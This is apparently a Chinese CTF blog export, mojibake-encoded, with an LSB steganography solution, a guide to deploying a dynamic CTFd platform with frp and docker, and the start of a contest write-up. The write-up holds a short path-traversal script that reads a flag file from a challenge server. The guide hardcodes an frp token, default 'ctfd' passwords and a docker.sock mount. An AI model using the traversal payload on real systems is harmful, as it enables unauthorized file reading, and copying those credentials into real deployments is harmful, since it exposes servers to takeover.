<p>é¦–å…ˆæ¥è®²pngå›¾ç‰‡ï¼Œpngå›¾ç‰‡æ˜¯ä¸€ç§æ— æŸå‹ç¼©çš„ä½å›¾ç‰‡å½¢æ ¼å¼ï¼Œä¹Ÿåªæœ‰åœ¨æ— æŸå‹ç¼©æˆ–è€…æ— å‹ç¼©çš„å›¾ç‰‡ï¼ˆBMPï¼‰ä¸Šå®ç°lsbéšå†™ã€‚å¦‚æœå›¾åƒæ˜¯jpgå›¾ç‰‡çš„è¯ï¼Œå°±æ²¡æ³•ä½¿ç”¨lsbéšå†™äº†ï¼ŒåŸå› æ˜¯jpgå›¾ç‰‡å¯¹åƒæ•°è¿›è¡Œäº†æœ‰æŸå‹ç¼©ï¼Œæˆ‘ä»¬ä¿®æ”¹çš„ä¿¡æ¯å°±å¯èƒ½ä¼šåœ¨å‹ç¼©çš„è¿‡ç¨‹ä¸­è¢«ç ´åã€‚è€Œpngå›¾ç‰‡è™½ç„¶ä¹Ÿæœ‰å‹ç¼©ï¼Œä½†å´æ˜¯æ— æŸå‹ç¼©ï¼Œè¿™æ ·æˆ‘ä»¬ä¿®æ”¹çš„ä¿¡æ¯ä¹Ÿå°±èƒ½å¾—åˆ°æ­£ç¡®çš„è¡¨è¾¾ï¼Œä¸è‡³äºä¸¢å¤±ã€‚BMPçš„å›¾ç‰‡ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ˜¯æ²¡æœ‰ç»è¿‡å‹ç¼©çš„ã€‚BMPå›¾ç‰‡ä¸€èˆ¬æ˜¯ç‰¹åˆ«çš„å¤§çš„ï¼Œå› ä¸ºBMPæŠŠæ‰€æœ‰çš„åƒæ•°éƒ½æŒ‰åŸæ ·å‚¨å­˜ï¼Œæ²¡æœ‰è¿›è¡Œå‹ç¼©ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200419222005146.png" alt="image-20200419222005146" style="high:80%;width:80%;" />

<p>ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåè¿›åˆ¶çš„235è¡¨ç¤ºçš„æ˜¯ç»¿è‰²ï¼Œæˆ‘ä»¬ä¿®æ”¹äº†åœ¨äºŒè¿›åˆ¶ä¸­çš„æœ€ä½ä½ï¼Œä½†æ˜¯é¢œè‰²çœ‹èµ·æ¥ä¾æ—§æ²¡æœ‰å˜åŒ–ã€‚æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹æœ€ä½ä½ä¸­çš„ä¿¡æ¯ï¼Œå®ç°ä¿¡æ¯çš„éšå†™ã€‚</p>
<p>è¿™é‡Œçš„é¢˜ç›®æ˜¯ä¸€å¼ pngå›¾ç‰‡ï¼š</p>
<p>LSBæ˜¯å°†åŸæœ¬çš„åƒç´ è½¬8ä½2è¿›åˆ¶ï¼Œå°†8ä½2è¿›åˆ¶çš„å·¦åä¸€ä½ç½®0æˆ–è€…ç½®1æ¥éšå†™æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æšä¸¾æ‰€æœ‰åƒç´ ï¼Œå½“è¯¥ä½åƒç´ æœ€åä¸€ä½ä¸ä¸º0æ—¶ï¼Œç½®ä¸º255çš„é»‘ç‚¹ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;C:\\Users\\Think\\Desktop\\LSB\\01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">		tmp = img.getpixel((i,j))</span><br><span class="line">		<span class="keyword">if</span> tmp&amp;<span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">			img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p>å³å¯å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚æ‰«ç å³å¯å¾—åˆ°flagã€‚</p>
<img src="http://img.kawhi.xyz/image-20200419222749603.png" alt="image-20200419222749603" style="high:80%;width:80%;" />]]></content>
      <categories>
        <category>æ‚é¡¹</category>
      </categories>
  </entry>
  <entry>
    <title>æ­å»ºåŠ¨æ€CTFd</title>
    <url>/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h3><p>ç½‘ä¸Šçš„æ­å»ºæ•™ç¨‹æœ‰å¾ˆå¤šäº†ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªæ¯”è¾ƒå‘çš„åœ°æ–¹çš„èµ„æ–™æ¯”è¾ƒé›¶æ•£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ä»é›¶å¼€å§‹æ­å»ºçš„è¿‡ç¨‹ï¼Œè™½ç„¶å› ä¸ºå„ç§åŸå› æœ€åè¿˜æ˜¯å­¦è´¤å¤§ä½¬å¸®æˆ‘æ­å¥½äº†ğŸ™ƒï¼Œè¿™ä¸ªåŠ¨æ€é¶æœºæ˜¯çœŸçš„æ–¹ä¾¿ã€‚</p>
<h3 id="å‰ç½®å·¥ä½œ"><a href="#å‰ç½®å·¥ä½œ" class="headerlink" title="å‰ç½®å·¥ä½œ"></a><strong>å‰ç½®å·¥ä½œ</strong></h3><p>æœ¬ç¯‡æ­å»ºç¯å¢ƒä¸ºcentos7.6</p>
<p>å­¦è´¤å¤§ä½¬ç”¨çš„æ˜¯ubuntu18ä¹Ÿæ­æˆåŠŸäº†ï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯centosæ¯”è¾ƒæ–¹ä¾¿ã€‚</p>
<h4 id="æ›´æ–°yumæº"><a href="#æ›´æ–°yumæº" class="headerlink" title="æ›´æ–°yumæº"></a><strong>æ›´æ–°yumæº</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum install -y git nginx mariadb mariadb-server Mysql-python python-pip gcc  python-devel yum-utils device-mapper-persistent-data lvm2 epel-release</span><br></pre></td></tr></table></figure>

<h4 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a><strong>å®‰è£…docker</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ¢æº</span></span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment">#æŸ¥çœ‹å¹¶é€‰æ‹©åˆé€‚çš„dockerç‰ˆæœ¬</span></span><br><span class="line">yum list docker-ce --showduplicates | sort -r</span><br><span class="line"><span class="comment">#å®‰è£…docker</span></span><br><span class="line">yum -y install docker-ce</span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">docker --version</span><br><span class="line"><span class="comment">#å¯åŠ¨docker</span></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<h4 id="å®‰è£…docker-compose"><a href="#å®‰è£…docker-compose" class="headerlink" title="å®‰è£…docker-compose"></a><strong>å®‰è£…docker-compose</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum install python3-pip</span><br><span class="line">pip3 install docker-compose</span><br><span class="line"><span class="comment">#æ›´æ”¹äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™</span></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment">#æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h4 id="dockeré•œåƒåŠ é€Ÿ"><a href="#dockeré•œåƒåŠ é€Ÿ" class="headerlink" title="dockeré•œåƒåŠ é€Ÿ"></a><strong>dockeré•œåƒåŠ é€Ÿ</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://e5ee9xyr.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…frp"><a href="#å®‰è£…frp" class="headerlink" title="å®‰è£…frp"></a><strong>å®‰è£…frp</strong></h3><h4 id="ä¸‹è½½frp"><a href="#ä¸‹è½½frp" class="headerlink" title="ä¸‹è½½frp"></a><strong>ä¸‹è½½frp</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">wget https://github.com/fatedier/frp/releases/download/v0<span class="number">.29</span><span class="number">.0</span>/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64.tar.gz</span><br><span class="line">cd frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64</span><br><span class="line">cp systemd/* /etc/systemd/system/</span><br><span class="line">mkdir /etc/frp</span><br><span class="line">cp frpc.ini  frps.ini /etc/frp/</span><br><span class="line">cp frpc  frps /usr/bin/</span><br><span class="line">chmod a+x /usr/bin/frpc /usr/bin/frps</span><br><span class="line">systemctl enable frps</span><br></pre></td></tr></table></figure>

<p>FRPçš„æ–‡ä»¶wgetå¤ªæ…¢çš„è¯ï¼Œå¯ä»¥ä¸‹è½½åå†ç›´æ¥æ‹–åˆ°rootçš„ç›®å½•ä¸‹ã€‚</p>
<h4 id="ä¿®æ”¹frps-ini"><a href="#ä¿®æ”¹frps-ini" class="headerlink" title="ä¿®æ”¹frps.ini"></a><strong>ä¿®æ”¹<code>frps.ini</code></strong></h4><p>ä¿®æ”¹<code>frps.ini</code>å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim /etc/frp/frps.ini</span><br></pre></td></tr></table></figure>

<p><code>frps.ini</code>çš„å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">7897</span></span><br><span class="line">bind_addr = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨frpsç³»ç»ŸæœåŠ¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">systemctl start frps</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹frpc-ini"><a href="#ä¿®æ”¹frpc-ini" class="headerlink" title="ä¿®æ”¹frpc.ini"></a><strong>ä¿®æ”¹<code>frpc.ini</code></strong></h4><p>ä¿®æ”¹<code>frpc.ini</code>é…ç½®æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim /etc/frp/frpc.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br></pre></td></tr></table></figure>

<p>å†ä¿®æ”¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim ~/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64/frpc.ini</span><br></pre></td></tr></table></figure>

<p><code>frpc.ini</code>çš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span> <span class="comment"># è¿™é‡Œå¡«å†™å®¿ä¸»æœºifconfigä¹‹ådocker0çš„ip</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br><span class="line">admin_addr = <span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span> <span class="comment">#è¿™é‡Œå¡«å†™frpcå®¹å™¨åœ¨frpcadminç½‘ç»œé‡Œçš„ip</span></span><br><span class="line">admin_port = <span class="number">7400</span></span><br><span class="line">log_file = ./frps.log</span><br></pre></td></tr></table></figure>

<h4 id="åˆ›å»ºç½‘ç»œfrpadmin"><a href="#åˆ›å»ºç½‘ç»œfrpadmin" class="headerlink" title="åˆ›å»ºç½‘ç»œfrpadmin"></a><strong>åˆ›å»ºç½‘ç»œfrpadmin</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºç½‘ç»œå¹¶å¯åŠ¨frpcå®¹å™¨å¹¶é…ç½®frpc.ini</span></span><br><span class="line">docker network create ctfd_frp-containers</span><br><span class="line">docker run  -d -v ~/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64/frpc.ini:/etc/frp/frpc.ini --network=<span class="string">&quot;ctfd_frp-containers&quot;</span> --restart=always <span class="string">&quot;glzjin/frp&quot;</span></span><br><span class="line"><span class="comment">#åˆ›å»ºç½‘ç»œfrpcadminç”¨äºctfdå®¹å™¨å’Œfrpcå®¹å™¨é€šä¿¡</span></span><br><span class="line">docker network create frpcadmin</span><br><span class="line">docker network connect frpcadmin &lt;frpcå®¹å™¨åæˆ–è€…ID&gt;</span><br><span class="line"><span class="comment">#é‡å¯dockeræœåŠ¡</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="comment">#æŸ¥çœ‹frpcadminç½‘ç»œçš„è¿æ¥æƒ…å†µå¹¶è®°å½•frpcå®¹å™¨çš„ç½‘ç»œIP</span></span><br><span class="line">docker network inspect frpcadmin</span><br></pre></td></tr></table></figure>

<h4 id="tokenè„šæœ¬"><a href="#tokenè„šæœ¬" class="headerlink" title="tokenè„šæœ¬"></a><strong>tokenè„šæœ¬</strong></h4><hr>
<p>è¿™é‡Œæœ‰ä¸ªå¯ä»¥ç”Ÿæˆtokençš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    length_r = <span class="number">32</span></span><br><span class="line">    token = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">    length = len(chars) - <span class="number">1</span></span><br><span class="line">    random = Random()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length_r):</span><br><span class="line">        token += chars[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"><span class="keyword">print</span> get_token()</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…CTFd"><a href="#å®‰è£…CTFd" class="headerlink" title="å®‰è£…CTFd"></a><strong>å®‰è£…CTFd</strong></h3><h4 id="ä¸‹è½½CTFd"><a href="#ä¸‹è½½CTFd" class="headerlink" title="ä¸‹è½½CTFd"></a><strong>ä¸‹è½½CTFd</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">git clone https://github.com/CTFd/CTFd.git</span><br><span class="line">cd CTFd/</span><br><span class="line"><span class="comment">#å›æ»šåˆ°å½“å‰æ•™ç¨‹é€‚åˆçš„ç‰ˆæœ¬</span></span><br><span class="line">git reset <span class="number">6</span>c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 --hard</span><br><span class="line"><span class="comment">#æ‰“å¼€ctfdæ’ä»¶ç›®å½•</span></span><br><span class="line">cd CTFd/plugins</span><br><span class="line">git clone https://github.com/glzjin/CTFd-Whale.git ctfd-whale</span><br><span class="line">cd ctfd-whale</span><br><span class="line"><span class="comment">#å›æ»šåˆ°å½“å‰æ•™ç¨‹é€‚åˆçš„ç‰ˆæœ¬</span></span><br><span class="line">git reset <span class="number">5</span>b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard</span><br><span class="line"><span class="comment">#è¿”å›ctfdä¸»ç›®å½•</span></span><br><span class="line">cd ../../../</span><br></pre></td></tr></table></figure>

<p>æŠŠåŸç”Ÿçš„CTFdè£…å¥½åæ”¹ä¸€ä¸‹è¿™ä¸ªcssï¼Œè¿™ä¸€æ­¥éå¸¸é‡è¦ï¼Œå› ä¸ºåŸæœ¬çš„ç½‘ç«™è¢«å¢™äº†ï¼Œå¯¼è‡´è®¿é—®éå¸¸æ…¢ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ä¸‹cdnåŠ é€Ÿç‰ˆæœ¬çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /root/CTFd/CTFd/themes/core/static/css/vendor/font-awesome</span><br><span class="line"><span class="comment">#æ‰“å¼€fontawesome-fonts.css</span></span><br><span class="line"><span class="comment">#æŠŠç¬¬ä¸€å¥æ¢æˆ</span></span><br><span class="line"><span class="meta">@import url(&#x27;https://cdn.bootcss.com/font-awesome/5.13.0/css/all.css&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ¢ä¸€ä¸‹è¿™ä¸‰ä¸ªæ–‡ä»¶</p>
<h4 id="ä¿®æ”¹Dockerfile"><a href="#ä¿®æ”¹Dockerfile" class="headerlink" title="ä¿®æ”¹Dockerfile"></a><strong>ä¿®æ”¹<code>Dockerfile</code></strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FROM python:<span class="number">2.7</span>-alpine</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#x27;</span> /etc/apk/repositories &amp;&amp;\</span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    apk add python python-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev</span><br><span class="line">RUN adduser -D -u <span class="number">1001</span> -s /bin/bash ctfd</span><br><span class="line"></span><br><span class="line">WORKDIR /opt/CTFd</span><br><span class="line">RUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads</span><br><span class="line">RUN pip config set <span class="keyword">global</span>.index-url https://pypi.doubanio.com/simple</span><br><span class="line">RUN pip config set install.trusted-host pypi.doubanio.com</span><br><span class="line">COPY requirements.txt .</span><br><span class="line"></span><br><span class="line">RUN pip install -r requirements.txt -i  https://pypi.doubanio.com/simple</span><br><span class="line"></span><br><span class="line">COPY . /opt/CTFd</span><br><span class="line"></span><br><span class="line">RUN <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; do \</span><br><span class="line">      <span class="keyword">if</span> [ -f <span class="string">&quot;$d/requirements.txt&quot;</span> ]; then \</span><br><span class="line">        pip install -r $d/requirements.txt -i  https://pypi.doubanio.com/simple; \</span><br><span class="line">      fi; \</span><br><span class="line">    done;</span><br><span class="line"></span><br><span class="line">RUN chmod +x /opt/CTFd/docker-entrypoint.sh</span><br><span class="line">RUN chown -R <span class="number">1001</span>:<span class="number">1001</span> /opt/CTFd</span><br><span class="line">RUN chown -R <span class="number">1001</span>:<span class="number">1001</span> /var/log/CTFd /var/uploads</span><br><span class="line"></span><br><span class="line">USER <span class="number">1001</span></span><br><span class="line">EXPOSE <span class="number">8000</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹docker-compose-yml"><a href="#ä¿®æ”¹docker-compose-yml" class="headerlink" title="ä¿®æ”¹docker-compose.yml"></a><strong>ä¿®æ”¹<code>docker-compose.yml</code></strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      - UPLOAD_FOLDER=/var/uploads</span><br><span class="line">      - DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd</span><br><span class="line">      - REDIS_URL=redis://cache:<span class="number">6379</span></span><br><span class="line">      - WORKERS=<span class="number">1</span></span><br><span class="line">      - LOG_FOLDER=/var/log/CTFd</span><br><span class="line">      - ACCESS_LOG=-</span><br><span class="line">      - ERROR_LOG=-</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/CTFd/logs:/var/log/CTFd</span><br><span class="line">      - .data/CTFd/uploads:/var/uploads</span><br><span class="line">      - .:/opt/CTFd:ro</span><br><span class="line">      - /var/run/docker.sock:/var/run/docker.sock</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    networks:</span><br><span class="line">        default:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:<span class="number">10.4</span><span class="number">.12</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_USER=ctfd</span><br><span class="line">      - MYSQL_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_DATABASE=ctfd</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/mysql:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line">    <span class="comment"># This command is required to set important mariadb defaults</span></span><br><span class="line">    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=<span class="number">28800</span>, --log-warnings=<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  cache:</span><br><span class="line">    image: redis:<span class="number">4</span></span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">    - .data/redis:/data</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">    default:</span><br><span class="line">    internal:</span><br><span class="line">        internal: true</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹requirements-txt"><a href="#ä¿®æ”¹requirements-txt" class="headerlink" title="ä¿®æ”¹requirements.txt"></a><strong>ä¿®æ”¹<code>requirements.txt</code></strong></h4><p>åœ¨æœ€ä¸‹é¢æ·»åŠ ä¸€è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banal==<span class="number">0.4</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<p>æ„å»ºå¯åŠ¨é•œåƒã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>å°†ctfdè¿æ¥frpcadminç½‘ç»œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker network connect frpcadmin &lt;ctfdå®¹å™¨åæˆ–è€…ID&gt;</span><br><span class="line">docker network inspect frpcadmin</span><br></pre></td></tr></table></figure>

<h3 id="æ’ä»¶ä¿¡æ¯å¡«å†™"><a href="#æ’ä»¶ä¿¡æ¯å¡«å†™" class="headerlink" title="æ’ä»¶ä¿¡æ¯å¡«å†™"></a><strong>æ’ä»¶ä¿¡æ¯å¡«å†™</strong></h3><p>è¿›å…¥ç½‘ç«™æ’ä»¶å¡«å†™ä¿¡æ¯å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Docker API URL</span></span><br><span class="line">unix:///var/run/docker.sock</span><br><span class="line"><span class="comment">#Frp API IP</span></span><br><span class="line"><span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span>  <span class="comment">#frpcå®¹å™¨åœ¨frpcadminç½‘ç»œé‡Œçš„ip</span></span><br><span class="line"><span class="comment">#Frp API Port</span></span><br><span class="line"><span class="number">7400</span></span><br><span class="line"><span class="comment">#Frp Http Domain Suffix</span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment">#Frp Http Port </span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="comment">#Frp Direct IP Address</span></span><br><span class="line"><span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>  <span class="comment">#å…¬ç½‘IP</span></span><br><span class="line"><span class="comment">#Frp Direct Minimum Port </span></span><br><span class="line"><span class="number">28000</span></span><br><span class="line"><span class="comment">#Frp Direct Maximum Port </span></span><br><span class="line"><span class="number">28100</span></span><br><span class="line"><span class="comment">#Max Container Count </span></span><br><span class="line"><span class="number">100</span>         <span class="comment">#æœ€å¤§å®¹å™¨æ•°</span></span><br><span class="line"><span class="comment">#Max Renewal Times </span></span><br><span class="line"><span class="number">5</span>           <span class="comment">#å•ä¸ªå®¹å™¨æœ€å¤§ç»­æœŸæ¬¡æ•°</span></span><br><span class="line"><span class="comment">#Frp config template </span></span><br><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br><span class="line">admin_addr = <span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">admin_port = <span class="number">7400</span></span><br><span class="line">log_file = ./frps.log</span><br><span class="line"><span class="comment">#Docker Auto Connect Containers </span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment">#Docker Auto Connect Network </span></span><br><span class="line">ctfd_frp-containers</span><br><span class="line"><span class="comment">#Docker Dns Setting </span></span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a><strong>å¸¸è§é—®é¢˜</strong></h3><p>å¦‚æœå®¹å™¨çš„çŠ¶æ€ä¸ºrestartï¼Œå¯ä»¥ç”¨logsæ¥æŸ¥çœ‹å‘ç”Ÿäº†ä»€ä¹ˆé”™è¯¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker logs &lt;å®¹å™¨ID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="éƒ¨ç½²webé¢˜ç›®"><a href="#éƒ¨ç½²webé¢˜ç›®" class="headerlink" title="éƒ¨ç½²webé¢˜ç›®"></a><strong>éƒ¨ç½²webé¢˜ç›®</strong></h3><p>åœ¨Dockerfileé‡Œé¢å¡«å†™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FROM php:<span class="number">7.0</span>-apache</span><br><span class="line">CMD sh -c <span class="string">&quot;echo $FLAG &gt; /flag  &amp;&amp; export FLAG=not_flag &amp;&amp; FLAG=not_flag &amp;&amp; apache2-foreground&quot;</span></span><br></pre></td></tr></table></figure>

<p>å³å¯ç”ŸæˆåŠ¨æ€flag</p>
]]></content>
      <categories>
        <category>ç¯å¢ƒæ­å»º</category>
      </categories>
  </entry>
  <entry>
    <title>å®‰æ’ä¸ƒæœˆèµ›</title>
    <url>/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h3><p>å°±å‡ é“é¢˜ï¼Œæ°´ä¸€ä¸‹</p>
<h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a><strong>ezfileinclude</strong></h3><p>æ‰“å¼€é¢˜ç›®é“¾æ¥åæ˜¾ç¤ºå‡ºæ¥çš„æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ä¼šåœ¨imgæ ‡ç­¾ç§å‘ç°ä¸€ä¸ª/image.php?t=xxxxx&amp;f=base64(xxxx)</p>
<p>è¿™é“é¢˜ç›®è€ƒç‚¹ä¹Ÿæ˜¯æ–‡ä»¶è¯»å–ï¼Œæ‰€ä»¥åˆ©ç”¨ç‚¹è‚¯å®šåœ¨fè¿™ä¸ªå‚æ•°äº†ï¼Œä½†åªæ˜¯è¿‡æ»¤äº†å¼€å¤´çš„<code>../</code></p>
<p>è¿™é‡Œç”¨ä¸€ä¸‹Hhhmå¸ˆå‚…çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;hhhm/../../../../../../../../flag&quot;</span></span><br><span class="line">file = base64.b64encode(file.encode())</span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10009/image.php?t=&#123;0&#125;&amp;f=&#123;1&#125;&quot;</span></span><br><span class="line">now = int(time.time())</span><br><span class="line">rep = requests.get(url.format(str(now),file.decode()))</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>

